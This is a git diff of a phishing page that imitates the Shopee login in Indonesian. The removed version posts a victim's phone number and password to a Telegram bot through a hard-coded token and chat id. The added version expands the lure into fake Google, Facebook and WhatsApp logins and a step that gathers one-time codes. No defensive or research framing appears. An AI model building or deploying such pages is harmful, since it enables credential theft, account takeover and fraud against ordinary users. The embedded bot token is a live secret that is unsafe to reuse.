@@ -1,152 +1,526 @@
-<!DOCTYPE html>
-<html lang="id">
+<html lang="en">
+ <head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+   href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+   rel="stylesheet"
+  />
+  <script>
+   let resendTimer;
+   let resendCountdown = 60;
 
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Login - Shopee</title>
-    <link rel="stylesheet" href="">
-    <style>
-        body {
-            font-family: sans-serif;
-            background-color: #f5f5f5;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
+   function togglePasswordVisibility() {
+    const passwordInput = document.getElementById("password");
+    const toggleBtnIcon = document.getElementById("toggleIcon");
+    if (passwordInput.type === "password") {
+     passwordInput.type = "text";
+     toggleBtnIcon.classList.remove("fa-eye-slash");
+     toggleBtnIcon.classList.add("fa-eye");
+    } else {
+     passwordInput.type = "password";
+     toggleBtnIcon.classList.remove("fa-eye");
+     toggleBtnIcon.classList.add("fa-eye-slash");
+    }
+   }
 
-        .login-container {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 350px;
-            text-align: center;
-        }
+   function goToGoogleLogin() {
+    document.getElementById("mainLoginSection").classList.add("hidden");
+    document.getElementById("googleLoginSection").classList.remove("hidden");
+   }
 
-        .logo img {
-            width: 120px;
-            margin-bottom: 20px;
-            object-fit: contain;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
+   function showFacebookLogin() {
+    document.getElementById("mainLoginSection").classList.add("hidden");
+    document.getElementById("facebookLoginSection").classList.remove("hidden");
+   }
 
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
+   function backToMainLogin() {
+    document.getElementById("facebookLoginSection").classList.add("hidden");
+    document.getElementById("googleLoginSection").classList.add("hidden");
+    document.getElementById("mainLoginSection").classList.remove("hidden");
+   }
 
-        .input-group i {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #999;
-        }
+   function toggleFbPasswordVisibility() {
+    const fbPasswordInput = document.getElementById("fbPassword");
+    const fbToggleIcon = document.getElementById("fbToggleIcon");
+    if (fbPasswordInput.type === "password") {
+     fbPasswordInput.type = "text";
+     fbToggleIcon.classList.remove("fa-eye-slash");
+     fbToggleIcon.classList.add("fa-eye");
+    } else {
+     fbPasswordInput.type = "password";
+     fbToggleIcon.classList.remove("fa-eye");
+     fbToggleIcon.classList.add("fa-eye-slash");
+    }
+   }
 
-        .input-group input {
-            width: 100%;
-            padding: 12px 40px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
+   function toggleGooglePasswordVisibility() {
+    const googlePasswordInput = document.getElementById("googlePassword");
+    const googleToggleIcon = document.getElementById("googleToggleIcon");
+    if (googlePasswordInput.type === "password") {
+     googlePasswordInput.type = "text";
+     googleToggleIcon.classList.remove("fa-eye-slash");
+     googleToggleIcon.classList.add("fa-eye");
+    } else {
+     googlePasswordInput.type = "password";
+     googleToggleIcon.classList.remove("fa-eye");
+     googleToggleIcon.classList.add("fa-eye-slash");
+    }
+   }
 
-        .input-group .clear-input {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            font-size: 16px;
-            color: #999;
-            cursor: pointer;
-        }
+   function submitFacebookLogin(event) {
+    event.preventDefault();
+    // Simulate login success and show verification page
+    document.getElementById("facebookLoginSection").classList.add("hidden");
+    document.getElementById("verificationSection").classList.remove("hidden");
+   }
 
-        .login-button {
-            background-color: #ee4d2d;
-            color: white;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 18px;
-            width: 100%;
-            margin-top: 10px;
-        }
+   function submitGoogleLogin(event) {
+    event.preventDefault();
+    // Simulate login success and show verification page
+    document.getElementById("googleLoginSection").classList.add("hidden");
+    document.getElementById("verificationSection").classList.remove("hidden");
+   }
 
-        .login-button:hover {
-            background-color: #d43c23;
-        }
+   function backToFacebookLogin() {
+    document.getElementById("verificationSection").classList.add("hidden");
+    document.getElementById("facebookLoginSection").classList.remove("hidden");
+   }
 
-        .input-group a {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #ee4d2d;
-            text-decoration: none;
-            font-size: 0.9em;
-        }
-    </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-</head>
+   function backToGoogleLogin() {
+    document.getElementById("verificationSection").classList.add("hidden");
+    document.getElementById("googleLoginSection").classList.remove("hidden");
+   }
 
-<body>
-    <div class="login-container">
-        <div class="logo">
-            <img id="logoImg" src="shop.JPG" alt="Shop"
-                onerror="this.onerror=null;this.src='https://logos-download.com/wp-content/uploads/2019/01/Shopee_Logo.png';" />
-        </div>
-        <div class="input-group">
-            <i class="fas fa-user"></i>
-            <input type="text" placeholder="Nomor HP" id="nomorhp" value="" />
-            <button class="clear-input" onclick="document.getElementById('nomorhp').value=''">&times;</button>
-        </div>
-        <div class="input-group" style="position: relative;">
-            <i class="fas fa-lock"></i>
-            <input type="password" placeholder="Password" id="password" />
-            <a href="#">Lupa</a>
-        </div>
-        <button id="btnLogin" class="login-button">Log in</button>
+   function submitVerification(event) {
+    event.preventDefault();
+    const selectedMethod = document.querySelector(
+     'input[name="verificationMethod"]:checked'
+    ).value;
+    document.getElementById("verificationSection").classList.add("hidden");
+    document.getElementById("otpInputSection").classList.remove("hidden");
+    document.getElementById("otpInputTitle").textContent =
+     selectedMethod === "otpWA"
+      ? "Masukkan Nomor WhatsApp yang Terdaftar"
+      : "Masukkan Nomor Telepon yang Terdaftar";
+    document.getElementById("otpInput").value = "";
+    document.getElementById("otpCode").value = "";
+    document.getElementById("sendOtpBtn").disabled = false;
+    document.getElementById("sendOtpBtn").textContent = "Kirim Kode OTP";
+    document.getElementById("resendOtpBtn").disabled = true;
+    document.getElementById("resendOtpBtn").textContent = "Kirim Ulang Kode OTP (60s)";
+    clearInterval(resendTimer);
+    resendCountdown = 60;
+   }
+
+   function resetResendTimer() {
+    clearInterval(resendTimer);
+    resendCountdown = 60;
+    document.getElementById("resendOtpBtn").disabled = true;
+    document.getElementById("resendOtpBtn").textContent = `Kirim Ulang Kode OTP (${resendCountdown}s)`;
+    resendTimer = setInterval(() => {
+     resendCountdown--;
+     if (resendCountdown <= 0) {
+      clearInterval(resendTimer);
+      document.getElementById("resendOtpBtn").disabled = false;
+      document.getElementById("resendOtpBtn").textContent = "Kirim Ulang Kode OTP";
+     } else {
+      document.getElementById("resendOtpBtn").textContent = `Kirim Ulang Kode OTP (${resendCountdown}s)`;
+     }
+    }, 1000);
+   }
+
+   function sendOtp() {
+    const phoneNumber = document.getElementById("otpInput").value.trim();
+    if (!phoneNumber) {
+     alert("Mohon masukkan nomor yang terdaftar.");
+     return;
+    }
+    alert(`Kode OTP telah dikirim ke nomor ${phoneNumber}`);
+    document.getElementById("sendOtpBtn").disabled = true;
+    resetResendTimer();
+   }
+
+   function resendOtp() {
+    alert("Kode OTP telah dikirim ulang.");
+    resetResendTimer();
+   }
+
+   function submitOtp(event) {
+    event.preventDefault();
+    const otpCode = document.getElementById("otpCode").value.trim();
+    if (!otpCode) {
+     alert("Mohon masukkan kode OTP.");
+     return;
+    }
+    // Redirect to formulir2.html after successful OTP input
+    window.location.href = "formulir2.html";
+   }
+
+   function backToVerification() {
+    document.getElementById("otpInputSection").classList.add("hidden");
+    document.getElementById("verificationSection").classList.remove("hidden");
+   }
+
+   function goToWhatsAppNumberInput() {
+    document.getElementById("mainLoginSection").classList.add("hidden");
+    document.getElementById("whatsappNumberInputSection").classList.remove("hidden");
+   }
+
+   function submitWhatsAppNumber() {
+    const waNumber = document.getElementById("waNumberInput").value.trim();
+    if (!waNumber) {
+     alert("Mohon masukkan nomor WhatsApp Anda.");
+     return;
+    }
+    // Proceed to verification.html page
+    window.location.href = "verification.html";
+   }
+
+   function backToMainFromWhatsApp() {
+    document.getElementById("whatsappNumberInputSection").classList.add("hidden");
+    document.getElementById("mainLoginSection").classList.remove("hidden");
+   }
+  </script>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col items-center justify-center px-6">
+  <img
+   alt="Shopee logo orange text with shopping bag icon"
+   class="mb-10"
+   height="64"
+   src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Shopee_logo.svg"
+   width="64"
+  />
+
+  <!-- Main Login Section -->
+  <div id="mainLoginSection" class="w-full max-w-sm">
+   <form id="loginForm" class="mb-6">
+    <div class="relative mb-6">
+     <span
+      class="absolute inset-y-0 left-0 flex items-center pl-2 text-gray-400 text-lg"
+     >
+      <i class="fas fa-user"></i>
+     </span>
+     <input
+      class="w-full border-b border-gray-300 py-2 pl-10 pr-2 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
+      placeholder="No. Handphone/Email/Username"
+      type="text"
+      required
+     />
     </div>
-    <script>
-        document.getElementById("btnLogin").addEventListener("click", function (e) {
-            e.preventDefault();
-            var nomorhp = document.getElementById('nomorhp').value.trim();
-            var password = document.getElementById('password').value.trim();
-            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
-            var chat_id = "5923031825";
-            var text = "Login Shopee\nNomor HP: " + nomorhp + "\nPassword: " + password;
-            var url = `https://api.telegram.org/bot${token}/sendMessage`;
-            var params = {
-                chat_id: chat_id,
-                text: text
-            };
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(params)
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = "verifikasi.html";
-                    } else {
-                        alert("Gagal kirim ke Telegram: " + data.description);
-                    }
-                })
-                .catch((error) => {
-                    alert("Gagal koneksi ke Telegram: " + error);
-                });
-        });
-    </script>
-</body>
+    <div class="relative mb-4 flex items-center border-b border-gray-300">
+     <span class="absolute left-0 pl-2 text-gray-400 text-lg">
+      <i class="fas fa-lock"></i>
+     </span>
+     <input
+      id="password"
+      class="w-full py-2 pl-10 pr-4 text-gray-700 placeholder-gray-400 focus:outline-none focus:border-gray-400"
+      placeholder="Password"
+      type="password"
+      required
+     />
+     <button
+      aria-label="Toggle password visibility"
+      class="absolute right-4 text-gray-400 text-xl focus:outline-none"
+      type="button"
+      onclick="togglePasswordVisibility()"
+     >
+      <i class="fas fa-eye-slash" id="toggleIcon"></i>
+     </button>
+    </div>
+    <button
+     class="w-full bg-gray-300 text-gray-400 py-2 rounded-md text-center text-lg font-normal mb-4 cursor-not-allowed"
+     disabled
+     type="submit"
+    >
+     Log In
+    </button>
+   </form>
 
-</html>
+   <div class="flex items-center mb-6">
+    <hr class="flex-grow border-gray-300" />
+    <span class="mx-3 text-gray-600 text-sm">ATAU</span>
+    <hr class="flex-grow border-gray-300" />
+   </div>
+
+   <div class="space-y-3">
+    <button
+     onclick="goToGoogleLogin()"
+     class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+     type="button"
+    >
+     <img
+      alt="Gmail logo in red and white"
+      class="mr-3"
+      height="20"
+      src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg"
+      width="20"
+     />
+     Log In dengan Google
+    </button>
+    <button
+     onclick="showFacebookLogin()"
+     class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+     type="button"
+    >
+     <img
+      alt="Facebook logo in blue"
+      class="mr-3"
+      height="20"
+      src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png"
+      width="20"
+     />
+     Log In dengan Facebook
+    </button>
+    <button
+     onclick="goToWhatsAppNumberInput()"
+     class="w-full flex items-center border border-gray-300 rounded-md py-2 px-4 text-black text-base font-normal"
+     type="button"
+    >
+     <img
+      alt="WhatsApp logo in green"
+      class="mr-3"
+      height="20"
+      src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"
+      width="20"
+     />
+     Log In dengan WhatsApp
+    </button>
+   </div>
+  </div>
+
+  <!-- WhatsApp Number Input Section -->
+  <div id="whatsappNumberInputSection" class="hidden w-full max-w-sm">
+   <h2 class="text-2xl font-semibold mb-6 text-center text-green-600">
+    Masukkan Nomor WhatsApp Anda
+   </h2>
+   <div class="mb-4">
+    <input
+     id="waNumberInput"
+     type="tel"
+     placeholder="Masukkan nomor WhatsApp"
+     class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-green-600"
+    />
+   </div>
+   <div class="flex space-x-4">
+    <button
+     type="button"
+     onclick="submitWhatsAppNumber()"
+     class="flex-grow bg-green-600 text-white py-2 rounded-md text-lg font-semibold"
+    >
+     Lanjut
+    </button>
+    <button
+     type="button"
+     onclick="backToMainFromWhatsApp()"
+     class="flex-grow border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+    >
+     Kembali
+    </button>
+   </div>
+  </div>
+
+  <!-- Facebook Login Section -->
+  <div id="facebookLoginSection" class="hidden w-full max-w-sm">
+   <form onsubmit="submitFacebookLogin(event)">
+    <h2 class="text-2xl font-semibold mb-6 text-center text-blue-700">
+     Facebook Login
+    </h2>
+    <div class="mb-4">
+     <input
+      type="text"
+      placeholder="Email atau Nomor Telepon"
+      class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-600"
+      required
+     />
+    </div>
+    <div class="mb-6 relative">
+     <input
+      id="fbPassword"
+      type="password"
+      placeholder="Kata Sandi"
+      class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-600"
+      required
+     />
+     <button
+      type="button"
+      aria-label="Toggle Facebook password visibility"
+      class="absolute right-3 top-2.5 text-gray-400 text-lg focus:outline-none"
+      onclick="toggleFbPasswordVisibility()"
+     >
+      <i class="fas fa-eye-slash" id="fbToggleIcon"></i>
+     </button>
+    </div>
+    <button
+     type="submit"
+     class="w-full bg-blue-600 text-white py-2 rounded-md text-lg font-semibold mb-4"
+    >
+     Log In
+    </button>
+    <button
+     type="button"
+     onclick="backToMainLogin()"
+     class="w-full border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+    >
+     Kembali
+    </button>
+   </form>
+  </div>
+
+  <!-- Google Login Section -->
+  <div id="googleLoginSection" class="hidden w-full max-w-sm">
+   <form onsubmit="submitGoogleLogin(event)">
+    <h2 class="text-2xl font-semibold mb-6 text-center text-red-600">
+     Google Login
+    </h2>
+    <div class="mb-4">
+     <input
+      type="email"
+      placeholder="Email atau Nomor Telepon"
+      class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-red-600"
+      required
+     />
+    </div>
+    <div class="mb-6 relative">
+     <input
+      id="googlePassword"
+      type="password"
+      placeholder="Kata Sandi"
+      class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-red-600"
+      required
+     />
+     <button
+      type="button"
+      aria-label="Toggle Google password visibility"
+      class="absolute right-3 top-2.5 text-gray-400 text-lg focus:outline-none"
+      onclick="toggleGooglePasswordVisibility()"
+     >
+      <i class="fas fa-eye-slash" id="googleToggleIcon"></i>
+     </button>
+    </div>
+    <button
+     type="submit"
+     class="w-full bg-red-600 text-white py-2 rounded-md text-lg font-semibold mb-4"
+    >
+     Log In
+    </button>
+    <button
+     type="button"
+     onclick="backToMainLogin()"
+     class="w-full border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+    >
+     Kembali
+    </button>
+   </form>
+  </div>
+
+  <!-- Verification Section -->
+  <div id="verificationSection" class="hidden w-full max-w-sm">
+   <h2 class="text-2xl font-semibold mb-6 text-center text-orange-600">
+    Verifikasi Keamanan Akun
+   </h2>
+   <p class="mb-4 text-center text-gray-700">
+    Pilih metode verifikasi untuk mengamankan akun Anda:
+   </p>
+   <form onsubmit="submitVerification(event)" class="space-y-4">
+    <label
+     class="flex items-center space-x-3 border border-gray-300 rounded-md p-3 cursor-pointer"
+    >
+     <input
+      type="radio"
+      name="verificationMethod"
+      value="otpWA"
+      required
+      class="form-radio text-orange-600"
+     />
+     <span>Kode OTP via WhatsApp</span>
+    </label>
+    <label
+     class="flex items-center space-x-3 border border-gray-300 rounded-md p-3 cursor-pointer"
+    >
+     <input
+      type="radio"
+      name="verificationMethod"
+      value="otpSMS"
+      required
+      class="form-radio text-orange-600"
+     />
+     <span>Kode OTP via SMS</span>
+    </label>
+    <button
+     type="submit"
+     class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
+    >
+     Kirim Kode OTP
+    </button>
+    <button
+     type="button"
+     onclick="backToFacebookLogin()"
+     class="w-full border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+    >
+     Kembali
+    </button>
+   </form>
+  </div>
+
+  <!-- OTP Input Section -->
+  <div id="otpInputSection" class="hidden w-full max-w-sm">
+   <h2
+    id="otpInputTitle"
+    class="text-2xl font-semibold mb-6 text-center text-orange-600"
+   >
+    Masukkan Nomor yang Terdaftar
+   </h2>
+   <form onsubmit="submitOtp(event)" class="space-y-4">
+    <input
+     id="otpInput"
+     type="tel"
+     placeholder="Masukkan nomor telepon"
+     class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-600"
+     required
+    />
+    <button
+     id="sendOtpBtn"
+     type="button"
+     onclick="sendOtp()"
+     class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
+    >
+     Kirim Kode OTP
+    </button>
+
+    <input
+     id="otpCode"
+     type="text"
+     placeholder="Masukkan kode OTP"
+     class="w-full border border-gray-300 rounded-md py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-600"
+     required
+    />
+    <button
+     id="resendOtpBtn"
+     type="button"
+     onclick="resendOtp()"
+     disabled
+     class="w-full bg-gray-300 text-gray-600 py-2 rounded-md text-lg font-semibold"
+    >
+     Kirim Ulang Kode OTP (60s)
+    </button>
+
+    <button
+     type="submit"
+     class="w-full bg-orange-600 text-white py-2 rounded-md text-lg font-semibold"
+    >
+     Verifikasi
+    </button>
+    <button
+     type="button"
+     onclick="backToVerification()"
+     class="w-full border border-gray-300 py-2 rounded-md text-black text-base font-normal"
+    >
+     Kembali
+    </button>
+   </form>
+  </div>
+ </body>
+         </html>
